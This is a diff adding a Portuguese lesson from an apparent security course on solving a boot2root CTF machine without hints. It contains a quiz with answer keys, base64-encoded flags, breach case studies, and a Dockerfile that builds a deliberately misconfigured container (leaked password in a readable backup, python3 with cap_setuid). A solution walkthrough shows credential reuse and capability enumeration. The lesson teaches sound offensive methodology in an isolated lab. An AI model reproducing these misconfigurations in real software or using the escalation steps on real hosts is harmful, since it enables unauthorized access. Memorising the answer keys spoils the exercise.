@@ -1,0 +1,548 @@
+---
+slug: ctf-sem-dicas
+track: trilha-8
+title: "Máquina CTF sem dicas"
+prerequisites: [ctf-guiado]
+lab: null
+tasks:
+  - slug: flag-user
+    title: "Flag de usuário (user.txt)"
+    type: flag
+    prompt: "Vire o usuário karen e leia /home/karen/user.txt. Cole a flag no formato FLAG{...}."
+    hint: "Você é www-data. Pare de pensar em exploit e procure o que esta identidade LÊ: configs do site e backups esquecidos. Um segredo reaproveitado abre a próxima conta."
+    flag:
+      hash: "scrypt$16384$8$1$35f29e5338bf9ab070896157ef82e2717875eebf96c21b990d305dcff106c63a"
+      salt: "ec833981c6a5bfe323ff61f428e3e4d8"
+  - slug: flag-root
+    title: "Flag de root (root.txt)"
+    type: flag
+    prompt: "A partir de karen, vire root e leia /root/root.txt. Cole a flag no formato FLAG{...}."
+    hint: "Re-enumere COMO karen — o que você via como www-data não vale mais. Uma ferramenta de manutenção que só o grupo de karen roda guarda mais poder do que aparenta. Pense além de SUID e sudo."
+    flag:
+      hash: "scrypt$16384$8$1$457fcfe754d4164a84298f64f9f382c66cdb1fe02dadd258aa175868e09b9e1a"
+      salt: "524ee2d8ef236aa83452d4c140ea724a"
+  - slug: quiz-final
+    title: "Quiz — Máquina CTF sem dicas"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "No 8.2 você resolveu uma máquina com dicas; aqui, sem. Qual é a habilidade que este módulo de fato treina?"
+        options:
+          - "Memorizar mais comandos de exploração do que no módulo anterior"
+          - "Decidir sozinho o próximo passo a partir do que a enumeração revela, sem ninguém apontar o caminho"
+          - "Resolver a máquina mais rápido que no 8.2"
+          - "Usar apenas ferramentas automáticas, sem tocar no terminal"
+        answer: 1
+        explanation: "A técnica é a mesma do 8.2 (recon, foothold, privesc) — o que muda é a autonomia: ninguém diz onde olhar. A habilidade treinada é converter o que a máquina mostra em uma decisão de próximo passo. Não é decorar comandos, não é velocidade (CTF sem dicas costuma ser mais lento), e não é terceirizar tudo para automação."
+      - question: "Você saltou de www-data para karen. Por que a PRIMEIRA coisa a fazer como karen é re-enumerar, em vez de continuar de onde parou?"
+        options:
+          - "Porque o terminal perde o histórico ao trocar de usuário"
+          - "Por educação com a máquina"
+          - "Porque cada identidade enxerga coisas diferentes: regras de sudo, grupos, capabilities e arquivos legíveis que não existiam para a identidade anterior"
+          - "Porque re-enumerar apaga os rastros do www-data"
+        answer: 2
+        explanation: "Permissões no Linux são por identidade. O vetor que leva karen a root (uma ferramenta restrita ao grupo dela) era invisível e inexecutável para o www-data. Re-enumerar como a nova identidade é o que revela o próximo salto — é a etapa que o laço da autonomia repete a cada troca de conta. Não tem a ver com histórico, cortesia nem rastros."
+      - question: "Você está há 40 minutos insistindo num binário SUID que não leva a lugar nenhum. O que a metodologia manda fazer?"
+        options:
+          - "Continuar: desistir é de fraco, e a persistência sempre paga"
+          - "Reiniciar a máquina e recomeçar do zero"
+          - "Reconhecer que virou um rabbit hole, abandoná-lo, marcá-lo como descartado nas notas e voltar a enumerar outros vetores"
+          - "Procurar a resposta pronta num writeup da internet"
+          - "Partir direto para um kernel exploit"
+        answer: 2
+        explanation: "Um vetor que não anda dentro do seu time-box é um rabbit hole: insistir é o erro nº 1 de quem resolve CTF sem dicas. A disciplina é abandonar, anotar que foi descartado (para não voltar a ele por engano) e re-enumerar. Reiniciar não muda nada; buscar o writeup mata o exercício; e kernel exploit é último recurso, não a fuga de um beco."
+      - question: "No foothold você acha um db-legacy.php com a senha 'G4ll3ry_ReadOnly_2019', mas ela não serve para virar karen nem root. Qual é a lição?"
+        options:
+          - "A máquina está quebrada; a senha deveria funcionar"
+          - "Nem todo segredo encontrado é a chave do próximo salto; parte do que você acha é ruído (decoy) e precisa ser testada e descartada"
+          - "Toda senha de config sempre leva a root"
+          - "Você deveria ter usado essa senha com força bruta no root"
+        answer: 1
+        explanation: "Alvos (e máquinas reais) estão cheios de segredos que não levam a nada: contas desativadas, serviços mortos, credenciais read-only. O trabalho é testar cada achado contra o objetivo e descartar o que é decoy, sem ficar preso a ele. Não é bug da máquina, não é verdade que toda config leva a root, e insistir em bruteforce com a senha errada é mais um rabbit hole."
+      - question: "A máquina entrega user.txt e root.txt. O que essa convenção boot2root representa?"
+        options:
+          - "São dois enigmas independentes, sem relação entre si"
+          - "user.txt prova o foothold/acesso de usuário comum e root.txt prova o controle total do host; juntas, documentam a cadeia do acesso inicial até o comprometimento completo"
+          - "root.txt é opcional e vale só pontos extras"
+          - "As duas flags são a mesma, escritas em lugares diferentes"
+        answer: 1
+        explanation: "No estilo boot2root, user.txt marca que você obteve acesso como usuário comum e root.txt marca que escalou a root (controle total). A graça é justamente a cadeia entre as duas: é o acesso inicial seguido da escalação de privilégio, o mesmo arco de um comprometimento real. Não são independentes, root.txt é o objetivo final, e são valores distintos."
+      - question: "Como karen, `getcap -r / 2>/dev/null` mostra `/opt/maintenance/pyhealth cap_setuid=ep`. O que isso significa, concretamente?"
+        options:
+          - "Que o arquivo é um script que roda a cada login"
+          - "Que o binário carrega a Linux capability CAP_SETUID como efetiva e permitida, ou seja, pode trocar o próprio UID para 0 (root) sem ser SUID"
+          - "Que o arquivo está criptografado"
+          - "Que só o root consegue executá-lo"
+        answer: 1
+        explanation: "Capabilities quebram o poder do root em pedaços. CAP_SETUID permite ao processo mudar o próprio UID — inclusive para 0. Com `+ep` (efetiva e permitida) num binário que executa código (um Python), você chama `os.setuid(0)` e vira root, sem bit SUID nenhum. Não é um script de login, não é cifragem, e quem executa aqui é karen (o arquivo é do grupo dela), não só o root."
+      - question: "Por que anotar cada comando, evidência e horário ENQUANTO resolve, e não reconstruir de memória no fim?"
+        options:
+          - "Porque a plataforma exige um arquivo de log para validar a flag"
+          - "Porque o relatório é o entregável do trabalho, e a memória perde o comando exato, a evidência e a ordem dos saltos — justamente o que torna o achado reproduzível"
+          - "Porque anotar deixa o ataque mais rápido"
+          - "Porque sem anotar a flag não aparece"
+        answer: 1
+        explanation: "O produto de um pentest é o relatório reproduzível, e ele se escreve durante, não depois: de memória você perde o comando exato, a evidência (a saída) e a cronologia dos saltos. Anotar não é requisito da plataforma nem acelera o ataque, e a flag aparece independentemente — mas sem o registro você tem a invasão e não tem o trabalho."
+      - question: "Resolver esta máquina de treino é igual a um pentest real?"
+        options:
+          - "Sim, é idêntico em tudo"
+          - "Não: o CTF tem objetivo único (achar as flags) e ambiente isolado; um pentest real tem escopo e autorização por escrito, precisa de OPSEC (não derrubar produção, não fazer barulho à toa) e termina num relatório para o cliente"
+          - "Não, porque pentest real nunca usa enumeração"
+          - "Sim, exceto que no pentest real não existe escalação de privilégio"
+        answer: 1
+        explanation: "O método (recon, foothold, privesc, documentar) é o mesmo, e é por isso que o CTF treina. Mas o CTF é um objetivo fechado num ambiente que você pode quebrar à vontade; o engajamento real tem escopo e autorização, exige OPSEC e cuidado com a produção, e seu valor é o relatório. Enumeração e privesc existem nos dois — o que muda é o contorno profissional."
+glossary:
+  - term: boot2root
+    definition: "Estilo de máquina de CTF em que o objetivo é partir de fora (ou de um foothold de baixo privilégio) e escalar até o controle total do host (root/SYSTEM), colhendo normalmente duas flags: user.txt (acesso de usuário) e root.txt (acesso de root)."
+  - term: rabbit hole
+    definition: "Em um CTF, um caminho que parece promissor mas não leva a lugar nenhum. Reconhecer e abandonar um rabbit hole a tempo — em vez de insistir — é uma das habilidades centrais de quem resolve máquinas sem dicas."
+---
+
+import laco from "./img/laco-de-autonomia.svg";
+import arvore from "./img/arvore-travei.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+No módulo anterior (o 8.2) você resolveu uma máquina <GlossaryTerm term="boot2root">boot2root</GlossaryTerm> **com dicas**: a cada travada, havia um `<Hint>` para abrir. Foi o andaime certo para a primeira vez. Agora o andaime sai. Este módulo é sobre a diferença entre **saber a técnica** e **saber o que fazer a seguir** quando ninguém aponta o caminho — a habilidade que separa quem só segue roteiros de quem resolve uma máquina de verdade.
+
+A técnica aqui não é nova: é tudo o que você já treinou nas Trilhas 2 a 7 — <GlossaryTerm term="enumeration">enumeração</GlossaryTerm>, <GlossaryTerm term="foothold">foothold</GlossaryTerm>, <GlossaryTerm term="privilege escalation">privilege escalation</GlossaryTerm>. O que muda é que **você** decide o próximo passo, a partir do que a máquina revela. É por isso que este é um módulo de consolidação da Trilha 8, e não um módulo de ataque: ele treina **método sob incerteza**, não um vetor específico.
+
+Pense no momento clássico do iniciante: ele consegue uma shell numa máquina desconhecida e **congela** — sabe fazer dez ataques, mas não sabe qual fazer agora. A cura não é decorar um 11º ataque; é internalizar um **laço**: enumerar → levantar hipótese → testar num tempo limitado → registrar → e, a cada identidade nova, recomeçar. Quem tem esse laço nunca fica olhando para o cursor.
+
+No mundo real, é exatamente assim que grandes incidentes andaram. Quando a Uber foi comprometida em 2022, o invasor entrou por uma conta e **então procurou pela rede** até achar, num compartilhamento, um script com uma senha privilegiada que abriu tudo (seção 4). Ele não tinha um roteiro — ele enumerou e decidiu o próximo passo. É o laço deste módulo, rodando contra uma empresa real.
+
+**Ao final, você vai saber:**
+
+- aplicar o **laço da autonomia** (enumerar → hipótese → testar → registrar) para decidir sozinho o próximo passo numa máquina que você nunca viu;
+- reconhecer e abandonar um <GlossaryTerm term="rabbit hole">rabbit hole</GlossaryTerm> usando <GlossaryTerm term="time-boxing">time-boxing</GlossaryTerm>, em vez de insistir num vetor que não anda;
+- distinguir um achado real de uma isca (decoy) — porque nem todo segredo que você encontra é a chave do próximo salto;
+- resolver uma máquina boot2root de duas flags (user → root) **sem nenhuma dica durante a resolução**, re-enumerando a cada troca de identidade;
+- registrar o caminho (comando, evidência, horário) enquanto resolve, e entender por que um CTF **não** é a mesma coisa que um pentest real.
+
+**Pré-requisitos:** 8.2 — Máquina CTF guiada (o laço ponta a ponta com dicas; aqui você o repete sem elas). O módulo também usa, de forma solta, a escalação da Trilha 6 (SUID, sudo, <GlossaryTerm term="Linux capabilities">Linux capabilities</GlossaryTerm>), a <GlossaryTerm term="credential reuse">credential reuse</GlossaryTerm> do 6.6 e a disciplina de <GlossaryTerm term="writeup">writeup</GlossaryTerm> do 1.5.
+
+**Tempo estimado:** 2 a 4 horas — e, de propósito, sem um cronômetro: parte do exercício é você não ter um gabarito ao lado.
+
+<Callout variant="ethics">
+A máquina deste módulo é um **contêiner descartável que você monta na sua própria máquina (WSL)**, sem rede e sem vulnerabilidade escrita sob medida — só **más configurações** de software padrão. Resolver máquinas de CTF é legítimo porque o alvo é seu, isolado e feito para isso. Levar essas mesmas técnicas para um sistema que não é seu, sem **autorização por escrito** e <GlossaryTerm term="scope">escopo</GlossaryTerm> definido (Trilha 1), é crime no Brasil (acesso não autorizado a dispositivo informático, Lei 12.737/2012). Autonomia técnica sem disciplina ética é exatamente o que este curso **não** quer formar.
+</Callout>
+
+## 2. Teoria aprofundada — a autonomia por dentro
+
+### 2.1 O que é uma máquina CTF, e por que existe o "sem dicas"
+
+Uma <GlossaryTerm term="flag (CTF)">CTF</GlossaryTerm> (Capture The Flag) é um exercício em que você prova que resolveu um desafio achando uma **flag**: uma string escondida que só aparece quando você de fato completa o objetivo. No estilo **boot2root** — o desta trilha — a máquina é um host inteiro e o objetivo é ir do nada (ou de um foothold mínimo) até o controle total, colhendo normalmente duas flags: a `user.txt` (prova que você virou um usuário comum) e a `root.txt` (prova que você virou root). As duas juntas contam uma história: **acesso inicial → escalação de privilégio**, o mesmo arco de um ataque real.
+
+Por que tirar as dicas? Porque numa máquina real **não há dicas**. O alvo não tem um botão "Dica 1". Enquanto você depende de alguém dizer "agora olhe os arquivos de config", você não está resolvendo a máquina — está seguindo um roteiro. A competência de verdade é olhar para uma shell crua e saber, você mesmo, o que investigar primeiro. O "sem dicas" não é maldade pedagógica; é a única forma de treinar essa decisão.
+
+### 2.2 O laço da autonomia
+
+A resposta para "o que eu faço agora?" nunca é um comando específico — é um **laço**. Ele tem quatro passos e se repete até a máquina cair:
+
+1. **Enumerar.** Colher tudo o que a **identidade atual** enxerga: arquivos legíveis, serviços, permissões, grupos, tarefas agendadas, binários especiais. Enumerar é o centro de gravidade (você viu isso no 8.1): é o que transforma uma lista de possibilidades num alvo concreto.
+2. **Levantar hipótese.** A partir do que apareceu, escolher o vetor **mais promissor**: "este backup legível pode ter uma senha", "esta regra de sudo pode dar shell". Hipótese, não certeza.
+3. **Testar (com time-box).** Tentar o vetor — mas por um **tempo limitado**. Se em 15–20 minutos não andou, ele não é o caminho agora.
+4. **Registrar.** Anotar o que fez, a evidência (a saída) e o horário, **tenha dado certo ou não**. O "não deu certo" vale ouro: evita você repetir o mesmo beco daqui a uma hora.
+
+E então a regra de ouro: **cada salto reinicia o laço**. Assim que você vira outra identidade (de `www-data` para `karen`, de `karen` para `root`), você **re-enumera do zero como a nova identidade** — porque permissões no Linux são por usuário, e a conta nova enxerga coisas que a antiga não via.
+
+<Figure
+  src={laco}
+  alt="Ciclo de quatro caixas no sentido horário — enumerar, hipótese, testar com time-box, registrar — com uma saída verde quando o vetor funciona (nova identidade, recomeça) e uma volta laranja quando não funciona (enumerar de novo). No centro, a regra: cada salto reinicia o laço."
+  caption="O laço da autonomia: a resposta para 'e agora?' é sempre girar este ciclo — e cada troca de identidade o reinicia do começo."
+/>
+
+### 2.3 Hipótese: ler a máquina, não adivinhar
+
+Levantar uma hipótese boa é o oposto de chutar. Chutar é "vou tentar um exploit de kernel". Hipótese é "a enumeração mostrou um arquivo de config legível pela minha conta **e** um comentário citando outra conta — provavelmente há um segredo reaproveitado ali". A hipótese nasce de **cruzar** dois ou três sinais da enumeração, e aponta para um teste específico e barato. Se você se pegar tentando algo que a enumeração não sugeriu, pare: você voltou a adivinhar.
+
+### 2.4 Rabbit holes e time-boxing
+
+Um **rabbit hole** (literalmente "toca de coelho", da _Alice no País das Maravilhas_) é um caminho que parece promissor e consome horas sem levar a nada. CTFs são cheios deles — às vezes de propósito, às vezes por acaso. O iniciante cai no rabbit hole e **insiste**, porque abandonar parece desistir. É o erro nº 1 de quem resolve sem dicas.
+
+A defesa é o **time-boxing**: antes de atacar um vetor, você decide quanto tempo vai dar a ele (digamos, 20 minutos). Estourou o tempo sem progresso? Você **abandona**, anota "descartado" nas notas e volta a enumerar. Não é desistir — é administrar um recurso escasso (seu tempo e sua atenção) com método. Num engajamento real, o tempo é literalmente contratado; no CTF, é o seu fim de semana. Nos dois, insistir num beco é o desperdício mais caro.
+
+### 2.5 Achado real x isca (decoy)
+
+Nem todo segredo que você encontra é a chave do próximo salto. Uma máquina — e um alvo real — está cheia de **iscas**: uma senha de um serviço desativado, uma conta read-only, um backup de um sistema que não existe mais, um binário SUID padrão que o GTFOBins não explora. O trabalho é **testar cada achado contra o objetivo** e descartar o que não anda, sem se apegar. "Achei uma senha" não é "achei o caminho"; é só uma hipótese a testar. Confundir isca com vetor é como confundir ruído com sinal — e é por isso que a máquina deste módulo tem, de propósito, uma senha que não serve para nada.
+
+## 3. Na prática da segurança — como se trabalha sem roteiro
+
+Este é um módulo de fundamentos (consolidação), então esta seção não é "como explorar X", e sim **como um profissional usa a autonomia no dia a dia** — e onde o CTF se separa do trabalho real.
+
+### 3.1 A árvore do "travei, e agora?"
+
+Quando um pentester experiente trava, ele não "tenta mais forte" — ele desce uma checklist mental, em ordem. É a tradução do laço num algoritmo de desempate:
+
+<Figure
+  src={arvore}
+  alt="Árvore de decisão a partir de 'TRAVEI'. Pergunta 1: enumerei tudo que esta identidade vê? Se não, enumere por completo. Pergunta 2: estou no mesmo vetor além do time-box? Se sim, é rabbit hole, abandone e marque como descartado. Pergunta 3: re-enumerei como a identidade atual? Se não, rode de novo sudo -l, id, getcap e grupos. Pergunta 4: é achado real ou isca? Se isca, descarte. Se achado real, levante nova hipótese e teste num novo time-box."
+  caption="A árvore de desempate: quando travar, desça estas quatro perguntas em ordem antes de pedir qualquer dica. Quase sempre o bloqueio está numa delas."
+/>
+
+Repare que **nenhum** ramo da árvore é "procure a resposta num writeup". Buscar o writeup pronto no meio do desafio mata o que o desafio treina — é como ler o gabarito antes de tentar a prova. O writeup tem lugar (seção 6), mas **depois**.
+
+### 3.2 Enumeração: manual e automática se somam
+
+Na Trilha 6 você conheceu o LinPEAS — um script que varre a máquina atrás de vetores de escalação e os pinta por probabilidade. Ele é ótimo e você deve usá-lo. Mas a lenda do próprio LinPEAS avisa: ele aponta ~95% do que importa, e os outros 5% — o detalhe que vence a máquina — saem do **olho treinado** lendo a saída, e da enumeração manual (`id`, `sudo -l`, `getcap`, grupos, `find` por arquivos legíveis). Automático para cobertura, manual para o insight. Quem só roda o script e não lê a saída trava tanto quanto quem não roda nada.
+
+### 3.3 O que o CTF treina — e o que ele não ensina
+
+O método do CTF (enumerar, achar o vetor, escalar, documentar) é o mesmo de um engajamento real, e é por isso que o treino vale. Mas há diferenças que você **precisa** ter claras para não levar hábitos errados ao trabalho:
+
+- **Objetivo.** No CTF, o objetivo é único e explícito: achar as flags. Num pentest, o objetivo é responder à pergunta do cliente (as <GlossaryTerm term="crown jewels">joias da coroa</GlossaryTerm> estão protegidas?) dentro de um <GlossaryTerm term="scope">escopo</GlossaryTerm> contratado.
+- **Barulho e OPSEC.** No CTF você pode fazer todo o barulho do mundo — a máquina é sua. Num ambiente real, derrubar a produção com um exploit instável ou disparar mil alertas à toa é falha profissional. O CTF **não** treina essa contenção; você aprende isso na Trilha 1 e no relatório (8.4).
+- **Entregável.** O CTF termina na flag. O pentest termina no **relatório** reproduzível. A flag é a anedota "eu entrei"; o relatório é o trabalho.
+
+Levar o vício do CTF ("qualquer barulho vale, o que importa é a flag") para um engajamento real é um erro clássico de quem veio só de plataformas de CTF. O método, sim; a falta de contorno, não.
+
+## 4. Casos reais — o laço rodando contra empresas
+
+### Uber (2022) — o invasor entrou e então "resolveu a máquina"
+
+Em **15 de setembro de 2022** a Uber foi comprometida, e em **19 de setembro de 2022** publicou a análise oficial. O acesso inicial veio de engenharia social: o invasor obteve a senha de um contratante (provavelmente comprada na dark web) e, como havia <GlossaryTerm term="multi-factor authentication">MFA</GlossaryTerm> (autenticação de múltiplos fatores), disparou uma enxurrada de notificações de aprovação até o contratante, exausto e enganado por uma mensagem no WhatsApp se passando por "TI da Uber", aprovar uma — a técnica de **MFA fatigue**. Isso deu o foothold: acesso à VPN e à rede interna.
+
+O que aconteceu **depois** é a lição deste módulo. Com o foothold, o invasor **enumerou a rede** e encontrou, num compartilhamento interno, um **script PowerShell com credenciais privilegiadas em claro** para a solução de PAM (privileged access management, a gerência de acesso privilegiado) da empresa. Essas credenciais eram a chave de tudo: deram acesso de administrador a múltiplos sistemas internos (AWS, G Suite, Slack, o console do HackerOne, painéis internos). Um segredo esquecido num arquivo, achado por enumeração pós-foothold, transformou um acesso qualquer em comprometimento total — exatamente o salto `www-data` → `karen` da máquina que você vai resolver.
+
+- **Impacto:** acesso de administrador a dezenas de sistemas internos; a resposta exigiu derrubar ferramentas, rotacionar segredos e uma investigação pública.
+- **Lição:** o foothold raramente é o fim; a enumeração pós-acesso é o que escala. E um segredo privilegiado em texto claro num arquivo legível é um dos vetores mais comuns do mundo real — não um detalhe de CTF.
+- **Fonte:** [Uber Newsroom — "Security Update" (19 set. 2022)](https://www.uber.com/newsroom/security-update/); análise técnica corroborando o script de PAM em [CyberArk — "Unpacking the Uber Breach"](https://www.cyberark.com/resources/threat-research/unpacking-the-uber-breach).
+
+### Colonial Pipeline (2021) — uma credencial, nenhuma segunda barreira
+
+Em **29 de abril de 2021**, operadores do grupo DarkSide entraram na rede da Colonial Pipeline usando a senha de uma **conta de VPN legada** que ainda estava ativa e **não tinha MFA** — bastou a credencial, sem um segundo fator para barrar. Em **7 de maio de 2021** a empresa detectou o ransomware e parou o maior oleoduto de combustível dos Estados Unidos. Em **8 de junho de 2021**, o CEO Joseph Blount detalhou isso em depoimento ao Senado: a VPN "não deveria estar em uso", tinha fator único de autenticação e nem aparecia nas varreduras internas de ativos.
+
+O elo relevante aqui é a **falta de uma segunda barreira**: uma única credencial reaproveitada/vazada, numa conta esquecida e sem MFA, foi todo o foothold de que o atacante precisou. Na máquina deste módulo, é o eco da senha reaproveitada que abre a conta `karen` — um segredo que não deveria funcionar em dois lugares, mas funciona.
+
+- **Impacto:** parada de ~5.500 milhas de oleoduto, desabastecimento na Costa Leste dos EUA e um resgate de ~4,4 milhões de dólares pago (parte depois recuperada pelo FBI).
+- **Lição:** contas legadas sem MFA são foothold de graça. "Não sabíamos que existia" não protege ninguém — enumerar os próprios ativos é defesa, e não deixar credencial sem segundo fator é o corte mais barato.
+- **Fonte:** depoimento de Joseph Blount ao Senate Homeland Security & Governmental Affairs Committee (8 jun. 2021), reportado em [Dark Reading — "Colonial Pipeline CEO: Ransomware Attack Started via Pilfered 'Legacy' VPN Account"](https://www.darkreading.com/cyberattacks-data-breaches/colonial-pipeline-ceo-ransomware-attack-started-via-pilfered-legacy-vpn-account).
+
+## 5. Mãos à obra — a máquina "sem dicas"
+
+Este módulo **não tem lab na plataforma**: uma máquina boot2root é um host **mal configurado de propósito**, e a plataforma só orquestra alvos consagrados (DVWA, Juice Shop...). Então você monta, **na sua própria máquina (WSL)**, um contêiner descartável de treino — como fez no 6.3 e no 6.6. A diferença é o contrato deste módulo: **durante a resolução, não abra as soluções.** Resolva com a árvore da seção 3.1 ao lado, não com um `<Hint>`. As soluções recolhidas existem só para você **conferir** depois — ou destravar se, honestamente, esgotou a árvore.
+
+<Callout variant="info" title="Por que um contêiner, e por que sem rede">
+O `uid 0` **dentro** do contêiner não é o `root` do seu WSL/Windows (releia o 6.1): ele é isolado por namespaces e capabilities. Por isso dá para plantar segredos, uma capability e flags de root ali dentro sem risco nenhum para a sua máquina. E tudo sobe com `--network none` (sem rede) e `--rm` (some ao sair). É o ambiente certo para resolver uma máquina com segurança total.
+</Callout>
+
+**Objetivo:** ao terminar, você terá (1) saído do foothold `www-data` para o usuário `karen` e lido `/home/karen/user.txt` — a **flag de usuário**; e (2) escalado de `karen` a `root` e lido `/root/root.txt` — a **flag de root**. Duas flags, uma máquina, zero dicas durante o caminho.
+
+### 5.1 Montar a máquina (passo a passo)
+
+Abra o terminal do Ubuntu (WSL), crie uma pasta e os dois arquivos abaixo. O `Dockerfile` é a receita da máquina; o `entrypoint.sh` liga o ambiente e te deixa no foothold `www-data` — a identidade com que você "cai" na máquina, como se tivesse chegado por uma web shell.
+
+<CodeBlock
+  title="~/ctf-sem-dicas/Dockerfile"
+  lang="text"
+  code={`FROM debian:trixie-slim
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt-get update \\
+ && apt-get install -y --no-install-recommends \\
+    sudo gawk procps findutils login passwd libcap2-bin python3 file coreutils grep tar gzip \\
+ && rm -rf /var/lib/apt/lists/*
+
+# Foothold: the web service account you land on (www-data already exists).
+RUN install -d -o www-data -g www-data /var/www/html
+
+# Decoy secret: a DB password that is NOT reused anywhere (a dead end on purpose).
+RUN printf '%s\\n' \\
+  '<?php' \\
+  '// Legacy DB connection for the old gallery module.' \\
+  "\\$host = '127.0.0.1';" \\
+  "\\$user = 'gallery_ro';" \\
+  "\\$pass = 'G4ll3ry_ReadOnly_2019';   // read-only reporting account" \\
+  > /var/www/html/db-legacy.php \\
+ && chmod 644 /var/www/html/db-legacy.php
+
+# Second identity (karen), reached from a readable backup.
+RUN useradd --create-home --shell /bin/bash --uid 1000 karen \\
+ && echo 'karen:Spr1ng!Clean-backups' | chpasswd
+
+# A world-readable backup left in /var/backups, holding karen's note with the password.
+RUN install -d /tmp/_stage/home-karen \\
+ && printf '%s\\n' \\
+    'TODO reminders (karen):' \\
+    '- rotate the maintenance tool key next sprint' \\
+    '- stop reusing my login pass in scripts: Spr1ng!Clean-backups' \\
+    '- ask ops to lock down /opt/maintenance' \\
+    > /tmp/_stage/home-karen/notes.txt \\
+ && tar -czf /var/backups/home-karen.tar.gz -C /tmp/_stage home-karen \\
+ && chmod 644 /var/backups/home-karen.tar.gz \\
+ && rm -rf /tmp/_stage
+
+# user.txt: readable only after you become karen. (base64, so it is not in clear text)
+RUN echo 'RkxBR3t1c2VyLWJhY2t1cC1sZWFrLXd3dy10by1rYXJlbn0=' | base64 -d > /home/karen/user.txt \\
+ && chown karen:karen /home/karen/user.txt && chmod 600 /home/karen/user.txt
+
+# Root hop: a maintenance tool with cap_setuid, runnable ONLY by karen's group.
+RUN install -d -o root -g karen -m 0750 /opt/maintenance \\
+ && cp /usr/bin/python3 /opt/maintenance/pyhealth \\
+ && chown root:karen /opt/maintenance/pyhealth \\
+ && chmod 0750 /opt/maintenance/pyhealth \\
+ && setcap cap_setuid+ep /opt/maintenance/pyhealth
+
+# root.txt: readable only as root.
+RUN echo 'RkxBR3tyb290LWNhcF9zZXR1aWQtbWFpbnRlbmFuY2UtdG9vbH0=' | base64 -d > /root/root.txt \\
+ && chmod 600 /root/root.txt
+
+COPY entrypoint.sh /usr/local/sbin/entrypoint.sh
+RUN chmod 755 /usr/local/sbin/entrypoint.sh
+ENTRYPOINT ["/usr/local/sbin/entrypoint.sh"]`}
+/>
+
+<CodeBlock
+  title="~/ctf-sem-dicas/entrypoint.sh"
+  lang="bash"
+  code={`#!/bin/sh
+# Map the hostname (silences a sudo warning) and drop you into the foothold.
+echo "127.0.0.1 localhost $(hostname)" > /etc/hosts
+exec runuser -u www-data -- /bin/bash -l`}
+/>
+
+As duas flags do `Dockerfile` estão em **base64** de propósito: assim o texto da flag não vai em claro no módulo, mas, ao montar a máquina, cada arquivo nasce com a flag **certa** (a que a plataforma valida). Você só vai lê-las depois de escalar. Construa a imagem (isto usa a internet da sua máquina, uma vez só) e suba o contêiner **sem rede**:
+
+```console
+$ cd ~/ctf-sem-dicas
+$ docker build -t ctf-sem-dicas:local .
+$ docker run -it --rm --network none --hostname target ctf-sem-dicas:local
+```
+
+Você cai num shell. Confirme quem é:
+
+```console
+www-data@target:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Um foothold, exatamente como depois de uma web shell. A partir daqui, **nenhuma dica durante o caminho** — só a árvore da seção 3.1. Boa caçada.
+
+<Callout variant="tip" title="Se o docker pedir permissão">
+Se `docker` reclamar, rode com `sudo docker ...` ou adicione seu usuário ao grupo `docker` (lembre do 6.2: estar no grupo `docker` já é, por si só, um caminho a root no host). No WSL com Docker Desktop isso costuma já estar pronto.
+</Callout>
+
+### 5.2 Flag de usuário — do foothold ao usuário karen
+
+**Você é `www-data`.** O objetivo é virar `karen` e ler `/home/karen/user.txt`. Sem dica. Antes de tocar no teclado, diga em voz alta o passo 1 do laço: _enumerar tudo o que esta identidade vê_. Comece pelo que uma conta de serviço web costuma ler — o diretório da aplicação e os backups do sistema — e **teste cada segredo** que encontrar: ele leva a algum lugar, ou é isca?
+
+<Solution title="Solução — confira só depois de tentar">
+Enumeração do que o `www-data` lê. Primeiro o diretório web:
+
+```console
+www-data@target:/$ ls -la /var/www/html
+-rw-r--r-- 1 root root 167 ... db-legacy.php
+www-data@target:/$ cat /var/www/html/db-legacy.php
+<?php
+// Legacy DB connection for the old gallery module.
+$host = '127.0.0.1';
+$user = 'gallery_ro';
+$pass = 'G4ll3ry_ReadOnly_2019';   // read-only reporting account
+```
+
+Uma senha! Mas **teste a hipótese**: `su gallery_ro`/`su karen` com ela falham, e o comentário diz "read-only reporting account" — é uma **isca** (conta read-only de um módulo velho). Marque "db-legacy.php = decoy" nas notas e siga. Agora os backups do sistema, um lugar clássico de segredo esquecido:
+
+```console
+www-data@target:/$ ls -la /var/backups
+-rw-r--r-- 1 root root 284 ... home-karen.tar.gz
+www-data@target:/$ cd /tmp && tar -xzf /var/backups/home-karen.tar.gz
+www-data@target:/tmp$ cat home-karen/notes.txt
+TODO reminders (karen):
+- rotate the maintenance tool key next sprint
+- stop reusing my login pass in scripts: Spr1ng!Clean-backups
+- ask ops to lock down /opt/maintenance
+```
+
+O backup é legível por todos (`644`) e o próprio bilhete da `karen` confessa a `credential reuse`: ela reaproveita a senha de login num script. Teste a hipótese:
+
+```console
+www-data@target:/tmp$ su karen
+Password:
+karen@target:/tmp$ id
+uid=1000(karen) gid=1000(karen) groups=1000(karen)
+karen@target:/tmp$ cat /home/karen/user.txt
+FLAG{...}        # a flag de usuário — mande no cartão da tarefa
+```
+
+Você digita `Spr1ng!Clean-backups` (não aparece na tela) e vira `karen`, e o `cat` imprime a `user.txt`. **Lição:** o salto não foi exploit — foi enumerar o que a conta lê, descartar a isca e reaproveitar um segredo vazado num backup. Guarde também a pista que o bilhete deu de brinde: _"lock down /opt/maintenance"_ e _"maintenance tool key"_. Isso é a semente da próxima hipótese.
+</Solution>
+
+<FlagInput task="flag-user" />
+
+### 5.3 Flag de root — do usuário karen ao root
+
+**Você é `karen` agora.** O objetivo é virar `root` e ler `/root/root.txt`. A tentação é continuar de onde parou — **não faça isso.** Passo 1 do laço, de novo: _re-enumerar como a identidade atual_. O vetor que leva `karen` a root não existia para o `www-data`. E cuidado: não é SUID nem `sudo` desta vez (confira e descarte os dois) — pense no que mais, na Trilha 6, concede poder de root a um binário.
+
+<Solution title="Solução — confira só depois de tentar">
+Re-enumeração como `karen`. Os suspeitos de sempre dão em nada:
+
+```console
+karen@target:/$ sudo -l
+[sudo] password for karen:      # karen não está no sudoers — beco
+karen@target:/$ find / -perm -4000 -type f 2>/dev/null
+/usr/bin/passwd  /usr/bin/su  /usr/bin/mount ...   # só os SUID padrão do Debian — nenhum do GTFOBins útil
+```
+
+SUID e `sudo` são iscas aqui. Resta o terceiro vetor da Trilha 6: **Linux capabilities**. E a `karen` agora enxerga `/opt/maintenance` (o grupo dela é dono), que o bilhete mandou "lock down":
+
+```console
+karen@target:/$ getcap -r / 2>/dev/null
+/opt/maintenance/pyhealth cap_setuid=ep
